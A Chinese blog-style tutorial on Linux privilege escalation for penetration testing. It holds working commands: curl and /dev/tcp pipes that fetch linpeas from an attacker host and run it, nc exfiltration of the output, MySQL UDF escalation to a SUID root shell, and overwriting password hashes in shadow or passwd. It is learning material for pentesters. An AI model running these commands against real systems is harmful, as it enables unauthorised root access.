+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑<br>将结果传回本地阅读（因为有的靶机阅读不一定方便，还要对结果进行分析）<br><strong>kali</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo python3 -m http.server 80</span><br><span class="line">sudo nc -lvnp 81 | tee linpeas.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i-blog.csdnimg.cn/img_convert/b9bafff693d9cf622ef7389793d81781.png" alt="image-20251125201822766"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑<br><strong>靶机</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl kaliip/linpeas.sh | sh | nc kaliip 81 </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i-blog.csdnimg.cn/img_convert/5008c4a09781d18fe646bed50bf008f3.png" alt="image-20251125201949936"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑<br>这时，结果会显示在kali中，并且会把结果存入linpeas.txt（<strong>tee命令的作用，既显示又存储</strong>）<br><img src="https://i-blog.csdnimg.cn/img_convert/9c1134692deb9925440c8ac3b22fbca7.png" alt="image-20251125202143325"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<ul>
+<li><p>功能强大，输出详细。</p>
+</li>
+<li><p>支持openSSL加密，和base64的加密，如果需要绕过，免杀会有一定的效果</p>
+</li>
+<li><p>使用方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#一般方法，会在本地留下文件和痕迹</span><br><span class="line">wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh</span><br><span class="line">chmod +x linpeas.sh</span><br><span class="line">./linpeas.sh    #执行</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#linpeas官方推荐最佳实践，管道符给到sh执行linpeas的脚本，最大的好处是直接在线下载，直接执行，并不在本地存有任何文件</span><br><span class="line">curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh </span><br></pre></td></tr></table></figure>
+
+<p>扫描结果非常多，要具备手动枚举能力才能读懂</p>
+<blockquote>
+<ul>
+<li><strong>红&#x2F;黄</strong>：95% 概率是提权向量（RED 必看，Yellow 提醒）。</li>
+<li><strong>浅青</strong>：拥有控制台登录权限的用户。</li>
+<li><strong>蓝</strong>：无控制台用户 &amp; 已挂载设备。</li>
+<li><strong>绿</strong>：常规项（用户、组、SUID&#x2F;SGID、挂载点、.sh 脚本、cron）。</li>
+<li><strong>浅洋红</strong>：当前运行 LinPEAS 的用户名（你自己）。</li>
+</ul>
+</blockquote>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/8f8fb8ac13f367247bcb9be036d4e231.png" alt="image-20251125200430660"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<blockquote>
+<p>[!NOTE]</p>
+<p>假设靶机<strong>不能联网</strong>，如何利用linpeas</p>
+</blockquote>
+<p>现在kali用python3开启web服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python3 -m http.server 80</span><br></pre></td></tr></table></figure></li>
+<li><p>查看输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">less -r linpeas.txt     #vi阅读性特别差</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i-blog.csdnimg.cn/img_convert/4d5544d246aef86e96810afffa6baa6f.png" alt="image-20251125202642868"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑<br><strong>-r 是让颜色、进度条、表格线等 ANSI 转义序列原样显示，而不是打成 ^[[31m 一堆乱码。</strong></p>
+<blockquote>
+<p>[!NOTE]</p>
+<p><strong>靶机中curl不能用的情况</strong></p>
+</blockquote>
+<p><strong>kali</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nc -lvnp 80 &lt; linpeas.sh	#将linpeas.sh重定向到80端口</span><br></pre></td></tr></table></figure>
+
+<p><strong>靶机</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &lt; /dev/tcp/kaliip/80 | sh	#利用 Bash 内置的 /dev/tcp 伪设备，把远程脚本直接拉进内存并通过管道交给 sh 解释执行，全程不落盘。</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i-blog.csdnimg.cn/img_convert/44efd8d4968d8059ca4e6e7fbbe81ce9.png" alt="image-20251125203359192"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<ul>
+<li><code>nc -lvnp 80</code>：<ul>
+<li><code>-l</code> 进入监听（listen）模式；</li>
+<li><code>-v</code> 显示详细连接信息；</li>
+<li><code>-n</code> 禁止 DNS 解析，加快响应；</li>
+<li><code>-p 80</code> 指定本地端口为 80。</li>
+</ul>
+</li>
+<li><code>&lt; linpeas.sh</code>：把文件内容重定向到 nc 的标准输入，<strong>一旦有客户端连接，就把整份脚本按字节推送出去</strong>。</li>
+<li>结果 攻击机 80 端口变成 <strong>“一次性文件服务器”</strong></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p><strong>LinEnum</strong>：</p>
+<ul>
+<li>较早的工具，适用于<strong>较老的系统</strong>，如果不支持linpeas，就选这个。</li>
+</ul>
+</li>
+<li><p><strong>Linux-smart-enumeration</strong>：</p>
+<ul>
+<li>智能枚举，根据系统环境调整。</li>
+</ul>
+</li>
+<li><p><strong>Linux-exploit-suggester</strong>：</p>
+<ul>
+<li>根据内核版本和系统信息，提供可用的漏洞利用建议。</li>
+</ul>
+</li>
+<li><p><strong>Linuxprivchecker</strong>：</p>
+<ul>
+<li><strong>Python 编写</strong>，提供详细的权限检查。</li>
+</ul>
+</li>
+<li><p><strong>unix-privesc-check</strong>：</p>
+<ul>
+<li>适用于 Unix 和 Linux 系统。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="Linux提权精讲：演示1-服务漏洞利用提权，以MySQL-UDF提权为例"><a href="#Linux提权精讲：演示1-服务漏洞利用提权，以MySQL-UDF提权为例" class="headerlink" title="Linux提权精讲：演示1 - 服务漏洞利用提权，以MySQL-UDF提权为例"></a>Linux提权精讲：演示1 - 服务漏洞利用提权，以MySQL-UDF提权为例</h1><p>【「红队笔记」Linux提权精讲：演示1 - 服务漏洞利用提权，以MySQL-UDF提权为例】<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV19s4y1D7Mt?vd%5C_source=4d00741bef1efdd09444b6c478d355a0">https://www.bilibili.com/video/BV19s4y1D7Mt?vd\_source=4d00741bef1efdd09444b6c478d355a0</a></p>
+<p>Linux提权精讲，讲解并演示<strong>服务漏洞利用</strong>提权，以MySQL-UDF（MySQL的用户自定义函数 user defined function）提权为例，涉及利用的前提条件、原理、利用过程等。</p>
+<p>MySQL-UDF（MySQL的用户自定义函数 user defined function）通过UDF用户可以对数据库进行自定义操作，满足特点业务需求，实现数据库本身不具有的功能。这是MySQL内置机制</p>
+<h2 id="提权条件"><a href="#提权条件" class="headerlink" title="提权条件"></a>提权条件</h2><h3 id="1-掌握MySQL数据库的账号，有creat，insert，delete…以创建和使用函数（最好是root权限）"><a href="#1-掌握MySQL数据库的账号，有creat，insert，delete…以创建和使用函数（最好是root权限）" class="headerlink" title="1.掌握MySQL数据库的账号，有creat，insert，delete…以创建和使用函数（最好是root权限）"></a>1.掌握MySQL数据库的账号，有creat，insert，delete…以创建和使用函数（最好是root权限）</h3><p>对应的场景：获得初始立足点之后，能够对内容管理系统的配置文件或应用程序的数据库连接的配置文件进行查看，能获得一个MySQL凭据。如果凭据有creat，insert，delete权限，可以考虑用户自定义函数UDF提权</p>
+<h3 id="2-MySQL数据库的secure-file-priv-权限基本一般必须为空-‘-‘（即默认设置或包含所需目录plugin）"><a href="#2-MySQL数据库的secure-file-priv-权限基本一般必须为空-‘-‘（即默认设置或包含所需目录plugin）" class="headerlink" title="2.MySQL数据库的secure_file_priv 权限基本一般必须为空 ‘ ‘（即默认设置或包含所需目录plugin）"></a>2.MySQL数据库的<code>secure_file_priv</code> 权限基本一般必须为空 ‘ ‘（即默认设置或包含所需目录<code>plugin</code>）</h3><p>这是一个MySQL系统变量，用于限制 <code>load data // select into outfile // load_file( )</code> 这三种操作只能在特定目录下进行，以增强服务器的安全性</p>
+<p>如果非空，则 <code>load data // select into outfile // load_file( )</code> 这三种操作只能在显示的目录下执行</p>
+<p>创建的函数要写到<code>plugin</code>目录下</p>
+<p>如果为<code>null</code>则禁止一切操作</p>
+<h2 id="提权过程"><a href="#提权过程" class="headerlink" title="提权过程"></a>提权过程</h2><p>从CMS配置文件获得的一个用户，如果权限比较大想到UDF提权</p>
+<p>准备利用文件 <code>searchsploit mysql udf</code></p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/7ea405ed3f79134527cfd5f5a4c18aff.png" alt="image-20251125210816014"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>UDF的利用比较标准化，具体用哪个文件，不过是多尝试几次</p>
+<h3 id="1518-c-又叫-raptor-udf2-c利用文件提权演示"><a href="#1518-c-又叫-raptor-udf2-c利用文件提权演示" class="headerlink" title="1518.c 又叫 raptor_udf2.c利用文件提权演示"></a><code>1518.c</code> 又叫 <code>raptor_udf2.c</code>利用文件提权演示</h3><p>下载 <code>-m 1518.c</code> 这里的<code>raptor_udf2.c</code>是同一个文件 raptor是脚本编写者自定，跟提权没有关系</p>
+<p>注释包含了利用方式，版本信息，如这里指定的编译命令</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/b271cc6de2901edc71487d43a5909671.png" alt="image-20251125211458401"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/920337e5b6d10fb4e73ada11c30727a0.png" alt="image-20251125211356657"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -g -c raptor_udf2.c -fPIC</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<h3 id="1-g"><a href="#1-g" class="headerlink" title="1. -g"></a>1. <code>-g</code></h3><ul>
+<li><strong>作用</strong>：生成调试信息。</li>
+<li><strong>解释</strong>：这个选项会告诉 GCC 在编译过程中，将额外的调试信息（比如变量名、函数名、源代码行号等）嵌入到生成的目标文件（<code>.o</code> 文件）中。</li>
+<li><strong>用途</strong>：当你后续使用 GDB（GNU Debugger）等调试工具来调试这个程序时，这些信息是必不可少的。它让你能够在源代码层面单步执行、查看变量值等，极大地简化了调试过程。</li>
+<li><strong>在漏洞利用场景中的意义</strong>：虽然最终的恶意 payload 通常不需要调试信息（会增加文件体积），但在开发和测试这个 <code>raptor_udf2.c</code> 漏洞利用代码时，<code>-g</code> 选项是至关重要的。它允许开发者跟踪代码执行流程，发现并修复漏洞利用过程中的问题。</li>
+</ul>
+<h3 id="2-c"><a href="#2-c" class="headerlink" title="2. -c"></a>2. <code>-c</code></h3><ul>
+<li><strong>作用</strong>：只进行编译（Compile），不进行链接（Link）。</li>
+<li>解释<br>：C 语言程序的生成通常分为两个主要阶段：<ol>
+<li><strong>编译</strong>：将人类可读的 <code>.c</code> 源代码文件翻译成机器可读的<strong>汇编代码</strong>，然后再转换成<strong>目标文件</strong>（<code>.o</code> 文件）。目标文件包含了程序的二进制指令，但它还不是一个可以独立运行的程序。</li>
+<li><strong>链接</strong>：将你的目标文件与程序所依赖的其他目标文件和库（Libraries，如 <code>libc</code>）链接在一起，最终生成一个<strong>可执行文件</strong>。</li>
+</ol>
+</li>
+<li><strong>用途</strong>：使用 <code>-c</code> 选项可以让你只完成第一步。这在大型项目中很常见，可以将不同的源代码文件分别编译成目标文件，最后再统一进行链接，从而提高编译效率。在我们这个场景下，因为下一步我们要创建的是一个共享库（<code>.so</code> 文件），所以我们也需要先编译出 <code>.o</code> 文件。</li>
+</ul>
+<h3 id="3-raptor-udf2-c"><a href="#3-raptor-udf2-c" class="headerlink" title="3. raptor_udf2.c"></a>3. <code>raptor_udf2.c</code></h3><ul>
+<li><strong>作用</strong>：这是你要编译的<strong>源代码文件</strong>。</li>
+<li><strong>背景</strong>：<code>raptor_udf2.c</code> 是一个非常著名的针对 MySQL 用户自定义函数（UDF）的漏洞利用代码。它被设计用来编译成一个共享库（<code>.so</code> 文件），当这个恶意的 UDF 被加载到有漏洞的 MySQL 服务器中时，攻击者就可以执行任意系统命令，从而实现提权。这个文件名中的 “raptor” 是其作者或相关项目的名称。</li>
+</ul>
+<h3 id="4-fPIC"><a href="#4-fPIC" class="headerlink" title="4. -fPIC"></a>4. <code>-fPIC</code></h3><ul>
+<li><strong>作用</strong>：生成<strong>位置无关代码（Position-Independent Code）</strong>。</li>
+<li>解释<br>：这是一个非常关键的选项，尤其是在创建共享库（Shared Library，<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.so</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>文件）时。</p>
+<ul>
+<li><strong>位置相关代码</strong>：代码中的地址是绝对的。如果操作系统将这个程序或库加载到内存中与预期不同的地址，程序就会崩溃。</li>
+<li><strong>位置无关代码</strong>：代码中的地址是相对的。无论操作系统将这个共享库加载到内存的哪个位置，它都能正确运行。这是共享库的基本要求，因为多个程序可能同时使用同一个共享库，操作系统会为了效率将其加载到内存中的某个位置。</li>
+<li><strong>在漏洞利用场景中的意义</strong>：因为我们最终要将编译出的 <code>.so</code> 文件作为一个共享库注入到 MySQL 进程中执行，所以必须使用 <code>-fPIC</code> 选项来确保它能被正确加载和运行，而不会因为地址问题导致 MySQL 服务崩溃。</li>
+</ul>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -g -shared -Wl,-sonmae,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc</span><br></pre></td></tr></table></figure>
+
+
+<table>
+<thead>
+<tr>
+<th>片段</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-g</code></td>
+<td>保留调试符号（gdb 可调式）</td>
+</tr>
+<tr>
+<td><code>-shared</code></td>
+<td><strong>生成共享库</strong>（.so），不是可执行程序</td>
+</tr>
+<tr>
+<td><code>-Wl,-soname,raptor_udf2.so</code></td>
+<td>把<strong>内部 soname</strong>设为<code>raptor_udf2.so</code>，加载时 MySQL 按这个名字找文件</td>
+</tr>
+<tr>
+<td><code>-o raptor_udf2.so</code></td>
+<td>输出文件名</td>
+</tr>
+<tr>
+<td><code>raptor_udf2.o</code></td>
+<td>已编译好的目标文件（源文件先<code>gcc -c</code>生成）</td>
+</tr>
+<tr>
+<td><code>-lc</code></td>
+<td>显式链接 libc（通常可省，写上也无害）</td>
+</tr>
+</tbody></table>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/ab312c6c8cdcfc30815a26c0225d528e.png" alt="image-20251125214331007"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>登录到MySQL数据库中，下面的步骤按照<strong>Usage</strong>执行即可（注意<strong>路径</strong>是否需要更换）</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/109c61989a9b6eafad886c094648f8b3.png" alt="image-20251125214403451"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>验证<code>secure_file_priv</code>是否为空或是包含所用目录<code>plugin</code>，能UDF提权</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/2567c9a1abdb0a6b0f0e4b25d118cacb.png" alt="image-20251125214631297"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/0a6db9d644a849424b0f8b620a6bf725.png" alt="image-20251125214703047"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/f4a62fe1111650056afbbdf03aef70ff.png" alt="image-20251125215553588"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/b6258d8cbcbbbcaa8437344f9d30c928.png" alt="image-20251125215713815"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>此时，我们的自定义函数就创建完成了</p>
+<p>可以跟着后面走</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select do_system(&#x27;id &gt; /tmp/out; chown raptor.raptor /tmp/out&#x27;);</span><br><span class="line">mysql&gt; \! sh</span><br></pre></td></tr></table></figure>
+
+<p>也可以自己写，因为此时的这个自定义函数可以执行root命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select do_system(&#x27;cp /bin/bash /tmp/rootbash;chmod +xs /tmp/rootbash&#x27;)</span><br><span class="line">#将/bin/bash复制到新建的tmp目录下的rootbash里，给他xs权限，执行它就是在执行bash命令</span><br><span class="line">/tmp /rootbash -p 	#-p	强制 bash 以 真实 UID=0 的身份启动，不降级 ，也不加载普通用户的 env 文件；常配合 SUID/被夺 root-shell 用，防止掉权。</span><br></pre></td></tr></table></figure>
+
+<p>提权成功</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/c669655b02f9183a8ab335e8ccd89d9d.png" alt="image-20251125220355662"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>实质：MySQL可以执行系统命令，在MySQL中修改，再以root方式执行，完成提权</p>
+<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><h3 id="思维导图-1"><a href="#思维导图-1" class="headerlink" title="思维导图"></a>思维导图</h3><h1 id="Linux提权精讲：演示2-重磅大作！Linux提权大赏，20种Linux渗透测试提权演示精讲一次看完，渗透测试必修课一次彻底搞定！"><a href="#Linux提权精讲：演示2-重磅大作！Linux提权大赏，20种Linux渗透测试提权演示精讲一次看完，渗透测试必修课一次彻底搞定！" class="headerlink" title="Linux提权精讲：演示2 - 重磅大作！Linux提权大赏，20种Linux渗透测试提权演示精讲一次看完，渗透测试必修课一次彻底搞定！"></a>Linux提权精讲：演示2 - 重磅大作！Linux提权大赏，20种Linux渗透测试提权演示精讲一次看完，渗透测试必修课一次彻底搞定！</h1><p>【「红队笔记」Linux提权精讲：演示2 - 重磅大作！Linux提权大赏，20种Linux渗透测试提权演示精讲一次看完，渗透测试必修课一次彻底搞定！】<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Es4y1M7ZL?vd%5C_source=4d00741bef1efdd09444b6c478d355a0">https://www.bilibili.com/video/BV1Es4y1M7ZL?vd\_source=4d00741bef1efdd09444b6c478d355a0</a></p>
+<h2 id="shadow和passwd-3讲"><a href="#shadow和passwd-3讲" class="headerlink" title="shadow和passwd 3讲"></a>shadow和passwd 3讲</h2><h3 id="1-可读shadow文件利用提权"><a href="#1-可读shadow文件利用提权" class="headerlink" title="1,可读shadow文件利用提权"></a>1,可读shadow文件利用提权</h3><p>原理：用户的错误配置，导致shadow可读</p>
+<p>枚举<code>shadow</code>文件</p>
+<blockquote>
+<p>[!NOTE]</p>
+<p>为什么会想到看<code>shadow</code>文件？</p>
+<p>跟<code>cat /etc/password</code>同等地位</p>
+<p>历史记录，用户可以操作shadow文件</p>
+<p>等蛛丝马迹</p>
+</blockquote>
+<p><code>ls -liah /etc/shadow</code>看shadow文件是否全局可读，如果可读，可以尝试hash碰撞</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/19a48ff95bcf68948a5c86edf98a8d4d.png" alt="image-20251126192544697"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>这里获得两条hash数据，拿到本地kali，vim存入名为hash的文件，用<strong>john</strong>破解</p>
+<blockquote>
+<p>[!CAUTION]</p>
+<p>**$6$是SHA-512加密的，但hash-identifier可能会误判为SHA-256，**<strong>不过我们后续的john破解，没有指定format，john自己可以正确识别。</strong></p>
+<p>常见的加密类型：</p>
+<p>$1 是 MD5</p>
+<p>$2 A B Y 2 是decript或者是ploufish</p>
+<p>$6$ 是 SHA-512</p>
+</blockquote>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/cbce204299f36f98cecb6532a3de30cc.png" alt="image-20251126193051057"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>提权成功</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/5460d40c39304c2130ee162034806a44.png" alt="image-20251126193251417"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<h3 id="2，可写shadow文件利用提权"><a href="#2，可写shadow文件利用提权" class="headerlink" title="2，可写shadow文件利用提权"></a>2，可写shadow文件利用提权</h3><p>原理：用户的错误配置，导致shadow可写</p>
+<p>因为是利用重要文件的可写属性，在写操作之前先对该文件<code>shadow</code>做<strong>备份</strong></p>
+<p><code>cp /etc/shadow /tmp/shadow.bak</code></p>
+<p>这种操作不仅仅是因为渗透测试结束后要打扫战场，还原修改后的重要文件；还因为如果遇到不可预期的情况有回退的可能</p>
+<p>既然可写，就可以把root密码替换成自己的</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/9f91fcb29ecaf822a59cf78279c9c91c.png" alt="image-20251126194440348"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>需要一个工具 <code>mkpasswd</code>：用来生成Linux用户名和密码hash的</p>
+<p><code>-m</code> 指定hash的加密类型</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/cb5f07cc6a5ec2a98ee0f536b16df1f6.png" alt="image-20251126195009255"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>全部复制包括 <code>./</code></p>
+<p><code>vim /etc/shadow</code>替换掉原来的密码(第二个<code>:</code>之前) 保存退出即可</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/5c073dd85ba7a587a2211762b280fd31.png" alt="image-20251126195111483"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>此时密码已经被替换成我们自己的密码了</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/fb0b59be16bdd2d22dd028995f72b3a6.png" alt="image-20251126195404198"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<h3 id="3，可写passwd文件利用提权"><a href="#3，可写passwd文件利用提权" class="headerlink" title="3，可写passwd文件利用提权"></a>3，可写passwd文件利用提权</h3><p>查看当前用户 <code>/etc/passwd</code> 文件的权限</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/3090a55643511c81ba6e440c033b81c5.png" alt="image-20251126195554548"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>虽然现在的Linux发行版的密码都不写在passwd里，写在shadow文件里，但只要我们有passwd的写权限，就可以直接更改root密码</p>
+<p>因为文件比较重要，还是先做备份</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/ac1fd14c19b2135ab2803e725c92d46d.png" alt="image-20251126195753878"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>利用：生成一个我们自己密码的hash，用<code>openssl</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd 想设的密码</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i-blog.csdnimg.cn/img_convert/0b7707ac93a076c024b2a033ca9a5c1c.png" alt="image-20251126195933095"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>接下来把密码hash替换passwd里的<code>x</code></p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/7c0517d08330ea023c5c894e99094ac8.png" alt="image-20251126200112620"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>切换root账户即可</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/7f5eaaadc0977a1aca5cebab90ed6934.png" alt="image-20251126200155563"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<blockquote>
+<p>[!IMPORTANT]</p>
+<p>不管是<strong>可写shadow文件利用提权</strong>用到的 <code>mkpasswd</code>；还是<strong>可写passwd文件利用提权</strong>用到的openssl</p>
+<p><strong>都是可以生成Linux里面的密码hash值的</strong>，只是习惯而已</p>
+</blockquote>
+<h2 id="sudo环境变量提权"><a href="#sudo环境变量提权" class="headerlink" title="sudo环境变量提权"></a>sudo环境变量提权</h2><p>获得初始shell，进行枚举提权时，一定会用到 <code>sudo -l</code>看当前用户能执行哪些系统命令</p>
+<h3 id="提权过程-1"><a href="#提权过程-1" class="headerlink" title="提权过程"></a>提权过程</h3><p><code>sudo -l</code>看当前用户能执行哪些系统命令</p>
+<p>这里显示有环境变量的一些设置</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/44d90bf4ec07a605144fa9cbe0d692bb.png" alt="image-20251126202657802"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p><code>env_reset</code> 默认清空用户所有环境变量，再从头放白名单，防止 <strong>PATH&#x2F;LD_PRELOAD</strong> 等污染 root 上下文。</p>
+<p><code>env_keep+=LD_PRELOAD</code><strong>把 LD_PRELOAD 加回白名单</strong> → 允许 <strong>携带自定义共享库</strong> 进入 sudo 后的 root 进程。</p>
+<blockquote>
+<p><strong>危害</strong></p>
+<p>如果 sudo 规则里 <strong>同时</strong>出现：</p>
+<ol>
+<li><code>env_keep+=LD_PRELOAD</code></li>
+<li><strong>某条可执行命令</strong>（如 <code>find</code>&#x2F;<code>iftop</code>&#x2F;任意脚本）</li>
+</ol>
